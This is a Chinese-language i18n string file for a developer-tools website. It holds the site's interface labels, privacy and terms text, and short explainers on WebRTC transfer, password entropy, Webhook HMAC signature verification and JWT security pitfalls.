      'webhook_kb_title': 'Webhook 事件驱动架构与生产级安全规范',
      'webhook_kb_sub': '涵盖反向 HTTP 回调设计模式、HMAC-SHA256 签名校验算法与幂等性消费最佳实践。',


      // 模态框与通用
      'set_lang_label': '界面语言 / System Language',
      'privacy_modal_title': '隐私政策 (Privacy Policy)',
      'privacy_modal_body': '<p><strong>生效日期：2026年6月5日</strong></p><p>825412.xyz（以下简称“本站”）极其重视用户的个人隐私与数据安全。本隐私政策旨在向您说明本站在您使用我们的工具服务时，如何收集、使用和保护您的信息。</p><h3>1. 信息收集与本地存储</h3><p>本站致力于提供无需注册、即开即用的前端在线工具。我们不强制收集用户的姓名、身份证号或手机号码。</p><ul><li><strong>API Key 与配置：</strong>您在“设置中心”输入的 Gemini API Key 仅保存在您本地浏览器的 LocalStorage 中，绝不上传至本站或任何非官方服务器。</li><li><strong>剪贴板内容：</strong>您在匿名剪贴板中提交的内容将以加密形式存储，并在您选定的到期时间后自动永久销毁。</li></ul><h3>2. Cookie 与第三方广告展示</h3><p>本站接入了 <strong>Google AdSense</strong> 及相关第三方广告服务商。请您了解以下关于 Cookie 的政策：</p><ul><li>第三方供应商（包括 Google）会使用 Cookie 根据用户在此网站或其他网站上的历史访问记录来展示个性化广告。</li><li>Google 使用广告 Cookie（包括 DART Cookie），使其及其合作伙伴能够根据用户对本网站和/或互联网上其他网站的访问情况向用户投放广告。</li><li>用户可以通过访问 <a href="https://adssettings.google.com" target="_blank" style="color: var(--color-secondary);">Google 广告设置</a> 随时停用个性化广告。</li></ul><h3>3. 日志与网络分析</h3><p>为了保障网络性能及防范恶意攻击，云端网络（如 Cloudflare）可能会自动记录访问者的标准 Web 日志（包括 IP 地址、浏览器类型、访问时间及请求 URL）。这些日志仅用于安全审计与网络优化。</p><h3>4. 隐私政策修改</h3><p>本站保留随时更新本隐私政策的权利。修改后的条款一旦公布即刻生效。</p><h3>5. 联系我们</h3><p>如果您对本隐私政策有任何疑问或建议，请通过电子邮箱与我们联系：<code>leen8254@gmail.com</code>。</p>',
      'privacy_dismiss': '我知道了',
      'about_modal_title': '关于 825412.xyz',
      'about_modal_body': '<p><strong>825412.xyz</strong> 是一个专为开发者、极客及日常上网用户打造的开放式极客多功能工具箱。</p><p>我们秉承“极简、炫酷、安全、高效”的理念，打破传统工具网站繁琐的注册登录与弹窗限制。所有小工具均为纯前端响应式设计，搭配深邃的霓虹暗黑视觉体验。</p><h3>核心服务板块：</h3><ul><li><strong>控制台 (Dashboard)：</strong>实时感知网络节点与往返延迟，快速导航。</li><li><strong>匿名剪贴板：</strong>免登录的代码与文本临时中转站，支持设定定时销毁。</li><li><strong>极客工具箱：</strong>强密码生成、Unix 时间戳转换、Base64 编解码与字数统计。</li><li><strong>AI 智能助手：</strong>安全连接 Gemini 模型，提供私密强大的 AI 交互支持。</li></ul>',
      'about_dismiss': '关闭',
      'contact_modal_title': '联系我们 (Contact Us)',
      'contact_modal_body': '<p>感谢您使用 825412.xyz！我们非常重视您的反馈与建议。</p><p>如果您在使用过程中遇到任何 Bug、有功能改进想法、或者需要商务合作/广告咨询，请随时通过以下方式与站长联系：</p><div class="alert-box" style="margin-top: 16px;"><span class="material-symbols-outlined" style="vertical-align: middle;">mail</span> 站长联系邮箱：<code>leen8254@gmail.com</code></div><p>我们通常会在 24-48 小时内给予回复。</p>',
      'contact_dismiss': '确定',
      'terms_modal_title': '服务条款 (Terms of Service)',
      'terms_modal_body': '<p><strong>生效日期 / Effective Date：2026年6月5日</strong></p><p>欢迎访问并使用 <strong>825412.xyz</strong>（以下简称“本平台”或“本站”）。在使用本站提供的极客开发工具与相关服务前，请仔细阅读以下服务条款。</p><h3>1. 协议接受 (Acceptance of Terms)</h3><p>当您访问、浏览或使用本站提供的任何在线工具（包括匿名剪贴板、密码生成器、时间戳转换、文本工具与 AI 助手等），即表示您已阅读、理解并无条件接受本协议及我们的《隐私政策》。</p><h3>2. 用户行为规范与合法使用 (Acceptable Use)</h3><p>您同意仅将本站工具用于合法且合规的目的：</p><ul><li><strong>严禁有害内容：</strong>严禁在匿名剪贴板或 AI 对话中发布或传播包含木马病毒、恶意代码、侵犯他人知识产权或隐私的数据、以及违反法律法规的信息。</li><li><strong>网络安全准则：</strong>严禁针对本站发起任何自动化暴力请求、DDOS 拒绝服务攻击或恶意刷量。</li><li><strong>数据自毁提醒：</strong>匿名剪贴板具备定时自毁特性，请自行妥善留存重要数据副本。</li></ul><h3>3. 免责声明 (Disclaimer of Warranties)</h3><ul><li>本站所有工具与计算结果均按“现状 (AS IS)”提供，不提供任何明示或默示的适用性保证。</li><li>用户使用密码生成器生成的密码资产、AI 智能助手的对话建议等，均需由用户自行评估判断并承担使用风险。</li></ul><h3>4. 第三方广告与外链免责 (Third-Party Ads)</h3><p>本站接入了 Google AdSense 等合规广告投放网络。广告展示均由服务商算法动态匹配，本站不对任何第三方广告主提供的商品、服务或外部网站内容承担连带法律责任。</p><h3>5. 条款更新 (Modifications)</h3><p>我们保留在适当时机修订本条款的权利。修订版本一旦在网站发布即刻生效。</p>',
      'terms_dismiss': '我已阅读并同意',
      'media_opt_webp': 'WebP (推荐 · 极高压缩比)',
      'media_opt_jpeg': 'JPEG / JPG (兼容性好)',
      'media_opt_png': 'PNG (透明无损)',
      'media_opt_favicon': 'Favicon 图标 (.ico 32x32)',
      'media_max_width_ph': '例如：1920 (可选)',
      'ai_model_flash': 'Gemini 2.5 Flash (推荐)',
      'ai_model_pro': 'Gemini 2.5 Pro (深度推理)',
      'ai_model_lite': 'Gemini 2.5 Flash Lite (极速)',
      'airdrop_peer_count': '1 台设备在线',
      'webhook_count_badge': '0 条请求',
      'webhook_opt_post': 'POST (默认 JSON)',

      // 导航
      'nav_dashboard': '控制台',
      'nav_clipboard': '匿名剪贴板',
      'nav_toolbox': '极客工具箱',
      'nav_ai': 'AI 智能助手',
      'nav_airdrop': '极客隔空快传',
      'nav_webhook': 'Webhook 调试桩',
      'nav_settings': '设置中心',
      'nav_about': '关于本站',
      'nav_privacy': '隐私政策',
      'nav_terms': '服务条款',
      'nav_contact': '联系我们',

      // 控制台
      'dash_title': '控制台',
      'dash_subtitle': '实时感知网络节点，快速访问工具集合。',
      'dash_node_title': '系统节点与访问监控',
      'dash_visitor_ip': '访客 IP',
      'dash_location': '连接归属地',
      'dash_ping': '往返延迟 (Ping)',
      'dash_ai_title': 'AI Neural Link',
      'dash_ai_nokey': '未配置 API Key。请输入你的密钥以启用高级人工智能对话链路。',
      'dash_ai_ready': '<span style="color: var(--color-tertiary); font-weight: 600;">神经网络连接就绪。</span> 已连接至 Gemini API 核心。',
      'dash_ai_btn': '进入对话',
      'dash_toolbox_title': '快捷工具箱',
      'dash_shortcut_pwd': '密码生成器',
      'dash_shortcut_time': '时间转换',
      'dash_shortcut_text': '文本处理',
      'dash_no_pastes': '暂无最近分享的贴纸...',
      'dash_go_clip': '进入剪贴板',
      'dash_go_airdrop': '进入隔空快传',
      'dash_kb_title': '极客开发技术文库 & 开发者实用指南 (Developer Knowledge Hub)',
      'dash_kb_sub': '深入浅出的计算机网络、现代密码学、WebRTC 实时通信与 API 架构设计知识库。',
      'dash_card1_body': '<h3><span class="material-symbols-outlined" style="font-size: 18px;">lan</span> WebRTC P2P 局域网直连架构解析</h3><p>传统文件传输（如微信文件助手、企业微信）必须将文件上传到第三方服务器云盘，经过集中转存后再下载，存在<strong>传输慢、大小受限、隐私泄漏</strong>等弊端。</p><p>本站采用的 <strong>WebRTC (Web Real-Time Communication)</strong> 协议通过 STUN 信令服务器协商双方 NAT 地址后，直接在两台设备之间建立加密的 SCTP over DTLS 数据隧道：</p><ul><li><strong>零云端落盘</strong>：数据仅在两端浏览器内存之间流转，服务提供方无法截获。</li><li><strong>内网极速吞吐</strong>：同局域网下绕过公网带宽限制，传输速度可达内网物理带宽极限（百兆/千兆）。</li></ul>',
      'dash_card2_body': '<h3><span class="material-symbols-outlined" style="font-size: 18px;">security</span> 现代密码学与信息熵（Entropy）标准</h3><p>评估一个密码的安全强度，不能仅仅依靠“是否包含特殊符号”，而应依据 <strong>NIST SP 800-63B</strong> 国际密码学标准计算其<strong>信息熵（Bits）</strong>。</p><p>信息熵公式为：<code>E = L × log2(R)</code>，其中 <code>L</code> 为密码长度，<code>R</code> 为字符集空间大小：</p><ul><li><strong>低于 40 Bits</strong>：极弱，普通 GPU 秒级即可通过彩虹表爆破。</li><li><strong>60 ~ 80 Bits</strong>：中等强度，可抵御常规在线字典攻击。</li><li><strong>100 Bits 以上</strong>：极高强度，全球顶级超算集群暴力破解需要数十万年。</li></ul>',
      'dash_card3_body': '<h3><span class="material-symbols-outlined" style="font-size: 18px;">webhook</span> Webhook 事件驱动架构最佳实践</h3><p>在微服务与分布式系统中，<strong>Webhook（反向 HTTP 回调）</strong>相比传统定时轮询（Polling）节省了 95% 以上的无效网络开销与服务器 CPU 资源。</p><p>构建高可用的 Webhook 消费端必须遵循以下工程原则：</p><ul><li><strong>签名验证（Signature Verification）</strong>：校验 <code>HMAC-SHA256</code> 签名，防止假冒伪造。</li><li><strong>幂等性保障（Idempotency）</strong>：根据 <code>event_id</code> 做唯一索引去重，防范网络抖动重复投递。</li><li><strong>异步解耦</strong>：接收到请求后立即返回 <code>200 OK</code>，异步提交消息队列（Kafka/RabbitMQ）处理。</li></ul>',
      'dash_table_body': '<h3><span class="material-symbols-outlined" style="font-size: 18px;">table_chart</span> 开发者网络协议与常用密码学算法速查表</h3><div class="doc-table-wrapper"><table class="doc-table"><thead><tr><th>分类</th><th>名称 / 协议</th><th>标准端口 / 位宽</th><th>典型应用场景</th><th>安全等级</th></tr></thead><tbody><tr><td><strong>传输层</strong></td><td>HTTPS / TLS 1.3</td><td>443 (TCP)</td><td>Web 网站端到端加密传输、API 接口调用</td><td><span style="color: #10b981; font-weight: 700;">极高 (行业标准)</span></td></tr><tr><td><strong>实时通信</strong></td><td>WebRTC DataChannel</td><td>动态 UDP (STUN 3478)</td><td>浏览器 P2P 隔空文件快传、音视频通话</td><td><span style="color: #10b981; font-weight: 700;">极高 (DTLS 加密)</span></td></tr><tr><td><strong>哈希散列</strong></td><td>SHA-256</td><td>256 Bits (32 字节)</td><td>区块链、数字证书签名、Webhook HMAC 验签</td><td><span style="color: #10b981; font-weight: 700;">极高 (抗碰撞)</span></td></tr><tr><td><strong>哈希散列</strong></td><td>MD5</td><td>128 Bits (16 字节)</td><td>大文件完整性校验、内容去重 Hash</td><td><span style="color: #ef4444; font-weight: 700;">低 (已证实可碰撞)</span></td></tr><tr><td><strong>身份凭证</strong></td><td>JWT (JSON Web Token)</td><td>RFC 7519</td><td>无状态跨域身份认证、OAuth 2.0 Access Token</td><td><span style="color: #06b6d4; font-weight: 700;">高 (需强密钥)</span></td></tr></tbody></table></div>',

      // 剪贴板
      'clip_title': '匿名剪贴板',
      'clip_subtitle': '快速、临时的文本分享工具。分享完即可销毁。',
      'clip_ph': '// 在这里粘贴你的文本或代码...',
      'clip_1h': '1 小时后失效',
      'clip_24h': '24 小时后失效',
      'clip_7d': '7 天后失效',
      'clip_btn_create': '创建分享链接',
      'clip_share_result': '分享结果',
      'clip_share_url_label': '你的分享链接 (点击复制):',
      'clip_local_history': '本地历史记录',

      // 剪贴板 FAQ
      'clip_faq_title': '匿名剪贴板使用指南与常见问题 (FAQ)',
      'clip_faq_q1': '匿名剪贴板是如何工作的？',
      'clip_faq_a1': '您可以在输入框中粘贴任何代码片段、文本说明或临时笔记，选择到期时间后点击“创建分享链接”。系统将生成唯一的 Hash 分享地址（如 #paste=xxxx）。收到链接的接收者直接打开网页即可在弹窗中一键阅读与复制。',
      'clip_faq_q2': '内容安全与过期销毁机制',
      'clip_faq_a2': '系统支持 1小时、24小时和 7天三种自毁期限。一旦超出设定时间，云端数据将被彻底清除并无法恢复。我们不强制要求用户注册或提交任何个人身份信息，保障匿名与隐私。',

      // 工具箱
      'tool_title': '极客工具箱',
      'tool_subtitle': '免安装、零依赖、纯本地运算的高效极客与开发者在线工具集。',
      'tool_pwd_tab': '密码生成器',
      'tool_json_tab': 'JSON 格式化',
      'tool_jwt_tab': 'JWT 调试器',
      'tool_hash_tab': '哈希散列计算',
      'tool_time_tab': '时间戳转换',
      'tool_text_tab': '文本处理',
      'tool_net_tab': '网络与隐私探测',
      'tool_media_tab': '图片与媒体隐私',
      
      // 密码生成器与熵值分析
      'tool_pwd_gen': '点击下方生成按钮',
      'pwd_strength_title': '密码安全性评估：',
      'pwd_crack_time_label': '暴力破解预估耗时：',
      'pwd_charset_size_label': '可用字符集空间：',
      'pwd_rec_label': '安全合规建议：',
      'tool_pwd_len': '密码长度:',
      'tool_pwd_upper': '包含大写字母 (A-Z)',
      'tool_pwd_lower': '包含小写字母 (a-z)',
      'tool_pwd_num': '包含数字 (0-9)',
      'tool_pwd_sym': '包含特殊符号 (!@#$%)',
      'tool_pwd_btn': '生成安全密码',

      // JSON 工具
      'json_btn_format_2': '格式化 (2空格)',
      'json_btn_format_4': '格式化 (4空格)',
      'json_btn_minify': '压缩 JSON',
      'json_btn_copy': '复制结果',
      'json_ph': '在此粘贴待校验或格式化的 JSON 字符串...',
      'json_status_ready': 'JSON 解析器已就绪，输入后即刻进行语法树分析与高亮校验。',

      // JWT 调试器
      'jwt_input_label': 'Encoded Token (待解析令牌):',
      'jwt_btn_sample': '载入示例',
      'jwt_ph': '在此粘贴 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...',
      'jwt_valid_text': '纯前端安全解析：绝无任何 Token 上传至远程服务器风险。',
      'jwt_header_title': 'HEADER: 算法与令牌类型 (ALGORITHM & TOKEN TYPE)',
      'jwt_payload_title': 'PAYLOAD: 数据载荷 (DATA CLAIMS)',

      // 哈希计算
      'hash_ph': '在此输入需要计算散列哈希的任意文本或密码字符串...',
      'hash_mode_text': '文本字符计算',
      'hash_mode_file': '上传文件附件计算',
      'hash_uppercase_label': '大写输出 (A-F)',
      'hash_drop_hint': '拖拽待校验文件至此 或 点击选择本地文件',
      'hash_drop_sub': '纯前端本地瞬时计算，绝不上传至任何服务器，保障商业私密性 (支持大型固件/ISO/压缩包/安装包)',
      'hash_verify_title': '哈希一致性比对校验 (Checksum Matcher)',
      'hash_verify_ph': '在此粘贴官方提供的 MD5 / SHA-256 校验码，系统将自动进行毫秒级一致性比对...',
      'hash_verify_match_md5': '✅ 校验成功！完全匹配 MD5 校验码',
      'hash_verify_match_sha1': '✅ 校验成功！完全匹配 SHA-1 校验码',
      'hash_verify_match_sha256': '✅ 校验成功！完全匹配 SHA-256 校验码 (安全推荐)',
      'hash_verify_match_sha512': '✅ 校验成功！完全匹配 SHA-512 校验码',
      'hash_verify_mismatch': '⚠️ 校验码不匹配 (文件可能被篡改或损坏)',

      // 时间戳
      'tool_time_curr': '当前本地时间',
      'tool_time_copy_sec': '复制秒',
      'tool_time_conv_title': '时间戳转换',
      'tool_time_conv_label': '时间戳 (秒) -> 日期时间',
      'tool_time_conv_btn': '转换',
      'time_code_cheatsheet': '常用编程语言获取当前时间戳速查：',

      // 文本工具
      'tool_text_ph': '在这里输入你想处理的文本...',
      'tool_text_upper': '大写转换',
      'tool_text_lower': '小写转换',
      'tool_text_count': '计算字数与指标',
      'tool_text_b64enc': 'Base64 编码',
      'tool_text_b64dec': 'Base64 解码',
      'tool_text_urlenc': 'URL 编码',
      'tool_text_urldec': 'URL 解码',
      'tool_text_clear': '清空',
      'tool_text_res_label': '结果展示:',

      // 网络与隐私探测
      'net_ip_title': '我的公网 IP 与地理网络分析',
      'net_ip_loading': '正在探测公网 IP 与网络节点...',
      'net_ip_refresh': '刷新网络诊断',
      'net_ip_label': '公网 IPv4 / IPv6:',
      'net_geo_label': '归属地理 / 运营商:',
      'net_webrtc_title': 'WebRTC 本地 IP 穿透泄漏探测',
      'net_webrtc_desc': '检测在使用代理或 VPN 情况下，浏览器 WebRTC 是否会穿透泄漏真实局域网/公网 IP。',
      'net_webrtc_detecting': '正在发起 WebRTC ICE Candidate 探测...',
      'net_webrtc_safe': '🛡️ 安全：未检测到 WebRTC 穿透泄漏',
      'net_webrtc_leak': '⚠️ 警告：检测到 WebRTC 真实内网/公网 IP 泄漏: ',
      'net_ping_title': '全球骨干 CDN 节点网络测速 (Ping)',
      'net_ping_btn': '开始网络测速',
      'wifi_qr_title': 'WiFi 扫码一键直连二维码生成器',
      'wifi_qr_sub': '生成国际标准 WiFi 连接二维码，手机相机一扫即连，免去手动输入复杂密码。',
      'wifi_ssid_label': 'WiFi 名称 (SSID):',
      'wifi_ssid_ph': '例如：MyOffice_5G / Home_WiFi',
      'wifi_pwd_label': 'WiFi 密码:',
      'wifi_pwd_ph': '请输入无线网络密码 (无密码请留空)',
      'wifi_auto_hint_nopass': '智能识别：密码留空，将自动配置为无密码开放热点',
      'wifi_adv_options': '高级设置 (可选：手动指定加密/隐藏SSID)',
      'wifi_enc_auto': '⚡ 智能自动 (推荐)',
      'wifi_enc_label': '加密类型:',
      'wifi_hidden_label': '隐藏网络 (Hidden SSID)',
      'wifi_gen_btn': '生成 WiFi 二维码',
      'wifi_dl_btn': '下载二维码图片',
      'wifi_copy_str_btn': '复制直连字符串',

      // 图片与媒体隐私
      'media_compress_title': '纯前端图片极限压缩与格式互转',
      'media_compress_sub': '100% 浏览器本地内存极速压缩，绝不上传至任何服务器，零隐私泄露风险。',
      'media_drop_hint': '拖拽待处理图片至此 或 点击选择本地图片',
      'media_drop_sub': '支持 PNG, JPG, WebP, BMP (纯前端秒级处理)',
      'media_quality_label': '压缩画质:',
      'media_format_label': '输出格式:',
      'media_max_width_label': '最大宽度限制 (px, 留空保持原图):',
      'media_compress_btn': '开始压缩转换',
      'media_download_btn': '下载处理后图片',
      'media_stats_orig': '原图大小:',
      'media_stats_comp': '压缩后大小:',
      'media_stats_saved': '体积优化率:',
      'media_exif_title': '照片 EXIF 隐私与 GPS 经纬度擦除器',
      'media_exif_sub': '手机直出照片包含精确 GPS 经纬度、拍摄时间与相机设备信息。一键抹除所有隐私元数据，安全分享。',
      'media_exif_clean_btn': '一键清洗所有 EXIF 隐私并导出',
      'media_exif_no_gps': '✅ 未检测到敏感 GPS 物理定位信息',
      'media_exif_found_gps': '⚠️ 检测到照片内嵌拍摄者定位与设备隐私:',

      // 极客隔空快传 (AirDrop)
      'airdrop_title': '极客隔空快传 (AirDrop 网页版)',
      'airdrop_subtitle': '无需登录、跨局域网与设备秒级互传文件、文本与剪贴板，彻底告别微信文件传输助手。',
      'airdrop_my_device': '当前设备标识:',
      'airdrop_room_label': '当前互传频道:',
      'airdrop_qr_btn': '手机扫码互联',
      'airdrop_qr_modal_title': '手机扫码一键互联',
      'airdrop_qr_room_label': '房间号:',
      'airdrop_qr_modal_tip': '用手机自带相机或浏览器扫一扫，免安装 App 秒级加入当前房间直传文件与文本！',
      'airdrop_copy_invite': '复制直连链接',
      'airdrop_join_btn': '切换频道',
      'airdrop_send_title': '📤 投送文件与文本',
      'airdrop_peers_title': '频道内在线设备 (Connected Peers)',
      'airdrop_rescan_btn': '刷新对端设备',
      'airdrop_drop_hint': '拖拽文件至此 或 点击选择文件',
      'airdrop_drop_sub': '支持图片、压缩包、代码文件、文档 (最大 50MB)',
      'airdrop_text_ph': '输入你想秒传给手机或其他电脑的文本或代码...',
      'airdrop_send_text_btn': '投送文本至对端',
      'airdrop_recv_title': '📥 实时接收传输流',

      // 隔空快传技术白皮书
      'airdrop_doc_title': 'WebRTC 极客隔空快传技术原理与安全白皮书',
      'airdrop_doc_sub': '了解端到端免中转点对点通信、STUN NAT 穿透协议与零云端日志安全架构。',
      'airdrop_card1_body': '<h3><span class="material-symbols-outlined" style="font-size: 18px;">sync_alt</span> 1. WebRTC 点对点直连握手流程 (P2P Mesh)</h3><p><strong>极客隔空快传</strong>基于浏览器底层原生的 <code>RTCPeerConnection</code> 与 <code>RTCDataChannel</code> 技术构建，整个通信生命周期完全脱离集中式服务器中转：</p><ol><li><strong>信令协商 (Signaling)</strong>：两端设备加入相同频道码后，通过公共 STUN 服务器（如 Google STUN）解析出各自公网与局域网的 ICE Candidates（网络候选地址）。</li><li><strong>SDP 交换与打洞穿透</strong>：设备双方交换 SDP Offer/Answer 进行 NAT 穿透握手，直接在双端建立双向 UDP 加密通道。</li><li><strong>SCTP 分块流式投送</strong>：大文件被拆分为 64KB 的二进制 <code>ArrayBuffer</code> 数据包，直接在双方浏览器内存间高速喷射，接收端动态重组并触发本地下载。</li></ol>',
      'airdrop_card2_body': '<h3><span class="material-symbols-outlined" style="font-size: 18px;">security</span> 2. 为什么比微信文件助手/网盘更安全？</h3><p>在企业办公与敏感数据流转场景中，将代码、Token、密码或未公开文档发送给微信“文件传输助手”存在严重的合规隐患：</p><ul><li><strong>绝对零云端留存</strong>：本站没有任何中央存储服务器，你的文件和文本<strong>绝不经过任何云端硬盘</strong>，传输完毕立即释放内存。</li><li><strong>DTLS 军工级端到端加密</strong>：所有传输报文均由浏览器底层采用 DTLS (Datagram Transport Layer Security) 进行 128/256 位加密，局域网抓包者无法窃听。</li><li><strong>跨生态无缝互联</strong>：无需安装任何客户端或驱动，支持 Windows、Mac、Linux、iOS iPhone/iPad、Android 手机全平台秒级直传。</li></ul>',
      'airdrop_faq_title': '常见问题与传输排错 (FAQ)',
      'airdrop_faq_q1': '两台设备必须连接同一个 WiFi 路由器吗？',
      'airdrop_faq_a1': '不强制！只要两台设备都能访问互联网，WebRTC 就会自动进行 STUN 穿透尝试建立 P2P 直连。如果两台设备处于同一个 WiFi 局域网下，系统会自动优先走内网直连线路，传输速度可直接跑满千兆 WiFi 物理带宽！',
      'airdrop_faq_q2': '为什么另一端设备退出后，列表显示有时会延迟几秒？',
      'airdrop_faq_a2': '当对端主动关闭标签页时，系统会瞬间广播 bye 告别信令实现 0ms 瞬间下线。如果对端是手机锁屏断网或强制杀死进程，系统依靠底层的 1.5 秒高频 WebRTC 心跳探测器，在 3.5 秒无响应后会自动判定离线并从雷达列表中剔除。您也可以随时点击【刷新对端设备】进行主动重扫。',
      'airdrop_faq_q3': '单次传输文件有体积上限吗？',
      'airdrop_faq_a3': '建议单次投送文件在 50MB 以内。由于 WebRTC DataChannel 纯依赖浏览器内存进行流式分片拼接，过大的文件（如几个 G 的视频）容易导致低内存手机端浏览器崩溃。代码文件、高清图片、PDF 文档和各类常用压缩包均可无损秒传。',

      // Webhook 调试桩
      'webhook_title': 'Webhook 调试桩 & API 测试中继',
      'webhook_subtitle': '一键生成专属公网 HTTP 回调端点，实时捕获、格式化并分析第三方 Webhook (GitHub, Stripe, 微信支付等) 请求报文。',
      'webhook_endpoint_label': '你的专属 Webhook 接收端点 (URL):',
      'webhook_btn_copy_url': '复制 URL',
      'webhook_btn_copy_curl': '复制 cURL 命令',
      'webhook_curl_hint': '终端一键发送测试请求示例:',
      'webhook_mock_title': '🧪 模拟发送 Webhook',
      'webhook_method_label': 'HTTP Method',
      'webhook_body_label': 'Payload (JSON Body)',
      'webhook_btn_send_mock': '发送模拟请求',
      'webhook_logs_title': '📡 捕获到的请求报文',
      'webhook_empty_hint': '正在监听端点... 发送请求后将自动在此实时显示 Headers 与 Body 报文。',

      // Webhook 技术手册
      'webhook_doc_title': 'Webhook 事件驱动架构设计与生产级安全开发指南',
      'webhook_doc_sub': '掌握反向 HTTP 回调设计模式、HMAC-SHA256 验签算法、防重放攻击与分布式幂等性保障。',
      'webhook_card1_body': '<h3><span class="material-symbols-outlined" style="font-size: 18px;">compare_arrows</span> 1. Webhook 与传统 HTTP 轮询 (Polling) 深度对比</h3><p>在传统的客户端-服务端架构中，为了感知状态变化（如支付是否到账、代码是否推送），客户端必须每隔 3 秒调用一次查询接口：</p><ul><li><strong>轮询的劣势</strong>：99% 的请求返回“无变化”，浪费大量服务器 CPU、数据库连接与带宽；且存在秒级延迟。</li><li><strong>Webhook 的优势</strong>：被动监听，事件发生时（如订单支付成功）由第三方服务器<strong>主动推送一次 HTTP POST 报文</strong>，延迟在毫秒级，带宽消耗降低 90% 以上。</li></ul>',
      'webhook_card2_body': '<h3><span class="material-symbols-outlined" style="font-size: 18px;">lock_clock</span> 2. 生产级 Webhook 消费端五大安全规范</h3><p>对外暴露公开的回调端点极易受到黑客伪造请求或重放攻击，生产环境必须严格实施以下防线：</p><ol><li><strong>密钥签名验证 (HMAC Verification)</strong>：使用预共享密钥 <code>Secret</code> 对请求 Body 计算 <code>HMAC-SHA256</code>，比对 Headers 中的签名。</li><li><strong>防重放攻击 (Timestamp Validation)</strong>：校验请求头中的时间戳（如 <code>X-Client-Timestamp</code>），超过 5 分钟的过期请求直接拒绝。</li><li><strong>消费幂等性 (Idempotency)</strong>：根据 <code>order_id</code> 或 <code>event_id</code> 写入分布式锁或唯一索引，防止网络抖动重复投递。</li><li><strong>快速 200 应答与异步消费</strong>：在 500ms 内向发送方返回 <code>200 OK</code>，耗时业务推入后台队列（Redis/Celery）异步执行。</li></ol>',
      'webhook_card3_body': '<h3><span class="material-symbols-outlined" style="font-size: 18px;">code</span> 主流语言 Webhook HMAC-SHA256 安全验签示例代码</h3><div style="margin-top: 12px;"><div style="font-size: 13px; font-weight: 700; color: #38bdf8; margin-bottom: 6px;">🐍 Python (FastAPI / Flask) 示例:</div><pre class="code-snippet">import hmac, hashlib\n\ndef verify_webhook_signature(raw_body: bytes, signature_header: str, secret_key: str) -> bool:\n    expected_sig = "sha256=" + hmac.new(secret_key.encode(), raw_body, hashlib.sha256).hexdigest()\n    # 使用 hmac.compare_digest 防止基于执行时间差的计时攻击 (Timing Attack)\n    return hmac.compare_digest(expected_sig, signature_header)</pre></div><div style="margin-top: 14px;"><div style="font-size: 13px; font-weight: 700; color: #38bdf8; margin-bottom: 6px;">🟢 Node.js (Express) 示例:</div><pre class="code-snippet">const crypto = require("crypto");\n\nfunction verifyWebhook(rawPayload, signatureHeader, secret) {\n  const hmac = crypto.createHmac("sha256", secret);\n  const digest = "sha256=" + hmac.update(rawPayload).digest("hex");\n  return crypto.timingSafeEqual(Buffer.from(digest), Buffer.from(signatureHeader));\n}</pre></div>',

      // 工具箱深度技术知识专栏
      'tool_doc_title': '极客工具箱技术专栏与密码学算法知识库',
      'tool_doc_sub': '涵盖现代密码熵评估模型、JWT 无状态身份认证体系、单向散列抗碰撞性与时间系统原理。',
      'tool_gpu_table_body': '<h3><span class="material-symbols-outlined" style="font-size: 18px;">timer</span> 现代 GPU 算力集群（RTX 4090 矩阵）暴力破解密码耗时对照表</h3><p style="margin-bottom: 12px;">以下数据基于单机 8 卡 RTX 4090 集群（每秒约 1000 亿次 NTLM 哈希尝试）理论计算结果：</p><div class="doc-table-wrapper"><table class="doc-table"><thead><tr><th>密码长度</th><th>纯数字 (10个字符)</th><th>纯小写字母 (26个字符)</th><th>大小写混合 (52个字符)</th><th>大小写+数字+特殊符号 (94个字符)</th></tr></thead><tbody><tr><td><strong>6 位字符</strong></td><td><span style="color: #ef4444; font-weight:700;">瞬时 (0.001 秒)</span></td><td><span style="color: #ef4444; font-weight:700;">0.03 秒</span></td><td><span style="color: #ef4444; font-weight:700;">0.2 秒</span></td><td><span style="color: #f59e0b; font-weight:700;">7 秒</span></td></tr><tr><td><strong>8 位字符</strong></td><td><span style="color: #ef4444; font-weight:700;">0.01 秒</span></td><td><span style="color: #ef4444; font-weight:700;">2 秒</span></td><td><span style="color: #f59e0b; font-weight:700;">8 分钟</span></td><td><span style="color: #f59e0b; font-weight:700;">7 小时</span></td></tr><tr><td><strong>12 位字符</strong></td><td><span style="color: #ef4444; font-weight:700;">1 秒</span></td><td><span style="color: #f59e0b; font-weight:700;">3 周</span></td><td><span style="color: #10b981; font-weight:700;">200 年</span></td><td><span style="color: #10b981; font-weight:700;">3.4 万年</span></td></tr><tr><td><strong>16 位字符 (推荐)</strong></td><td><span style="color: #f59e0b; font-weight:700;">3 小时</span></td><td><span style="color: #10b981; font-weight:700;">4.5 万年</span></td><td><span style="color: #10b981; font-weight:700;">10 亿年</span></td><td><span style="color: #10b981; font-weight:700;">3.2 亿亿年 (绝对安全)</span></td></tr></tbody></table></div><div class="doc-callout success"><strong>💡 NIST 黄金法则</strong>：密码长度（Length）对安全强度的提升呈指数级倍增，远大于单纯增加复杂符号。建议日常密码长度<strong>保持在 16 位以上</strong>。</div>',
      'tool_card1_body': '<h3><span class="material-symbols-outlined" style="font-size: 18px;">lock</span> 1. 密码信息熵（Entropy）数学原理</h3><p>密码信息熵是香农信息论在计算机安全领域的延伸应用，公式为：<code>E = L × log2(N)</code>。</p><p>其中 <code>L</code> 为密码长度，<code>N</code> 为可用字符集池大小（大小写+数字+特殊符号共 94 个）。</p><ul><li><strong>低于 40 Bits</strong>：极度脆弱，秒级破解。</li><li><strong>60 ~ 80 Bits</strong>：普通企业级标准。</li><li><strong>90 Bits 以上</strong>：军工级抗爆破防护。</li></ul>',
      'tool_card2_body': '<h3><span class="material-symbols-outlined" style="font-size: 18px;">vpn_key</span> 2. JWT (RFC 7519) 核心架构与安全漏洞</h3><p>JWT 由 <code>Header.Payload.Signature</code> 三段组成，属于无状态身份凭证。开发中必须防范以下常见漏洞：</p><ul><li><strong>None 算法攻击</strong>：部分旧版库若未强制校验 <code>alg</code>，攻击者将 <code>alg: "none"</code> 即可伪造任意管理员身份。</li><li><strong>弱密钥爆破</strong>：使用纯数字或常见词作为 HMAC 签名密钥，极易被离线穷举爆破出 Secret。</li><li><strong>防 XSS 窃取</strong>：千万不要将 JWT 存在 <code>localStorage</code> 中，应使用 <code>HttpOnly SameSite=Strict</code> Cookie 存储。</li></ul>',
